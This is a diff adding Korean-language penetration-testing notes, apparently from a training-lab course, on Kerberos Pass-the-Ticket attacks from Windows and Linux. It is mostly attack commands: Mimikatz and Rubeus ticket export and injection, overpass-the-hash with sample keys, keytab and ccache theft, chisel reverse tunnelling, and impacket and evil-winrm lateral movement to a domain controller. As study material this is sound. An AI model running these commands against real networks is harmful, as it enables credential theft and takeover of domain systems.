@@ -502,4 +502,250 @@ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefre
 - 1로 설정하면 다른 로컬 관리자도 사용할 수 있음
 > `FilterAdministratorToken`(기본적으로 비활성화됨)이 활성화된 경우(값 1), RID-500 계정(Administrator)이 UAC 보호
 
+<br/><br/>
+## Pass the Ticket (PtT) from Windows
+
+### Windows에서 Kerberos 티켓 수집
+> 모든 티켓을 수집하려면 Mimikatz 또는 Rubeus를 관리자로 실행해야 함
+
+#### Mimikatz - Export Tickets
+```
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+c:\tools> dir *.kirbi
+```
+- `$`로 끝나는 티켓은 Active Directory와 상호 작용하려면 티켓이 필요한 컴퓨터 계정에 해당<br/>
+- 사용자 티켓에는 사용자의 이름과 서비스 이름과 도메인을 구분하는 `@`가 뒤따름(예: `[randomvalue]-username@service-domain.local.kirbi`)<br/>
+
+#### Rubeus - Export Tickets
+```c:\tools> Rubeus.exe dump /nowrap```
+
+### Pass the Key or OverPass the Hash(티켓 위조)
+> Mimikatz는 해시 패스/키 패스 공격을 수행하려면 관리자 권한이 필요하지만, Rubeus는 그렇지 않음
+
+#### Mimikatz - Extract Kerberos Keys
+```
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+#### Mimikatz - Pass the Key or OverPass the Hash
+```
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+#### Rubeus - Pass the Key or OverPass the Hash
+```c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap```
+
+### Pass the Ticket(PtT)
+
+#### Rubeus Pass the Ticket
+- ```c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt```<br/>
+- ```c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi```
+
+#### Convert .kirbi to Base64 Format
+```PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))```
+
+#### Pass the Ticket - Base64 Format
+```Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>```
+
+#### Mimikatz - Pass the Ticket
+```
+C:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+```
+> Mimikatz 모듈 `misc`을 사용하여 `misc::cmd`명령을 사용하여 가져온 티켓으로 새 명령 프롬프트 창을 시작 가능
+
+### Mimikatz - PowerShell Remoting with Pass the Ticket
+
+#### Mimikatz - Pass the Ticket for Lateral Movement
+```
+C:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+c:\tools>powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+```
+
+### Rubeus - PowerShell Remoting with Pass the Ticket
+
+#### Create a Sacrificial Process with Rubeus
+```C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show```
+
+#### Rubeus - Pass the Ticket for Lateral Movement
+```C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt```
+
+<br/><br/>
+## Pass the Ticket (PtT) from Linux
+> Linux 컴퓨터에서 Kerberos 티켓을 사용하려면 도메인에 가입할 필요가 없음
+
+### Linux 및 Active Directory 통합 식별
+- [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)이라는 도구를 사용하여 Linux 머신이 도메인에 가입되었는지 확인<br/>
+```$ realm list```
+- [sssd](https://sssd.io/) 또는 [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)) 도구 사용 여부로 확인 가능<br/>
+```$ ps -ef | grep -i "winbind\|sssd"```<br/>
+- 참고 :  [블로그 게시물](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/)
+
+### Finding Keytab Files
+
+#### Find를 사용하여 이름에 Keytab이 있는 파일 검색
+```$ find / -name *keytab* -ls 2>/dev/null```
+
+#### Cronjobs에서 Keytab 파일 식별
+```$ crontab -l```
+
+### Finding ccache Files
+
+#### ccache 파일의 환경 변수 검토
+```$ env | grep -i krb5```
+
+#### Searching for ccache Files in /tmp
+```$ ls -la /tmp```
+
+### Abusing KeyTab Files
+
+#### Listing keytab File Information
+```$ klist -k -t /opt/specialfiles/carlos.keytab```
+
+#### keytab을 사용하여 사용자 가장하기
+```
+$ klist
+$ kinit carlos@INLANEFREIGHT.HTB -k -t
+$ klist
+```
+> **kinit**은 대소문자를 구분하므로 klist에 표시된 것처럼 주체 이름을 사용해야 함
+
+#### Connecting to SMB Share as Carlos
+```$ smbclient //dc01/carlos -k -c ls```
+
+### Keytab Extract
+
+#### KeyTabExtract를 사용하여 키탭 해시 추출
+```$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab```
+- [Hashcat](https://hashcat.net/), [John the Ripper](https://www.openwall.com/john/), [https://crackstation.net/](https://crackstation.net/)
+
+#### Log in as Carlos
+```
+$ su - carlos@inlanefreight.htb
+$ klist
+```
+
+### Abusing Keytab ccache
+
+#### Privilege Escalation to Root
+```
+$ sudo -l
+(사용자가 모든 명령을 루트로 실행할 수 있는 경우)
+$ sudo su
+```
+
+#### Looking for ccache Files
+```# ls -la /tmp```
+
+#### id 명령을 사용하여 그룹 멤버십 식별
+```# id julio@inlanefreight.htb```
+
+#### Importing the ccache File into our Current Session
+```
+# klist
+# cp /tmp/krb5cc_647401106_I8I133 .
+# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+# klist
+# smbclient //dc01/C$ -k -c ls -no-pass
+```
+
+### Kerberos와 함께 Linux 공격 도구 사용
+
+#### Host File Modified
+```
+$ cat /etc/hosts
+
+# Host addresses
+
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
+```
+
+#### 프록시체인 구성 파일
+```
+$ cat /etc/proxychains.conf
+
+<SNIP>
+
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+#### Download Chisel to Attack Host
+```
+$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+$ gzip -d chisel_1.7.7_linux_amd64.gz
+$ mv chisel_* chisel && chmod +x ./chisel
+$ sudo ./chisel server --reverse
+```
+
+#### Connect to MS01 with xfreerdp
+```$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution```
+
+#### Execute chisel from MS01
+- 클라이언트 IP는 공격 호스트 IP<br/>
+```C:\> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks```
+
+#### KRB5CCNAME 환경 변수 설정
+```$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133```
+
+#### Using Impacket with proxychains and Kerberos Authentication
+```
+$ proxychains impacket-wmiexec dc01 -k
+C:\>whoami
+```
+> 도메인에 연결된 Linux 머신에서 Impacket 도구를 사용하는 경우 일부 Linux Active Directory 구현은 KRB5CCNAME 변수에 FILE: 접두사를 사용.
+> 이 경우 ccache 파일에 대한 경로만 포함하도록 변수를 수정해야 함
+
+#### Using Evil-WinRM with Kerberos
+- Kerberos에서 [evil-winrm](https://github.com/Hackplayers/evil-winrm)을 사용하려면 네트워크 인증에 사용되는 Kerberos 패키지(`krb5-user`)를 설치해야 함<br/>
+```$ sudo apt-get install krb5-user -y```<br/>
+- `krb5-user`가 이미 설치되어 있는 경우 구성 파일 `/etc/krb5.conf`를 다음 값을 포함하도록 변경<br/>
+```
+$ cat /etc/krb5.conf
+
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+
+<SNIP>
+```
+```$ proxychains evil-winrm -i dc01 -r inlanefreight.htb```
+
+### 기타 종류
+
+#### Impacket Ticket Converter
+```$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi```
+
+#### Importing Converted Ticket into Windows Session with Rubeus
+```
+C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+C:\htb> klist
+C:\htb> dir \\dc01\julio
+```
+
+#### Linikatz
+```
+$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+$ /opt/linikatz.sh
+```
+
 
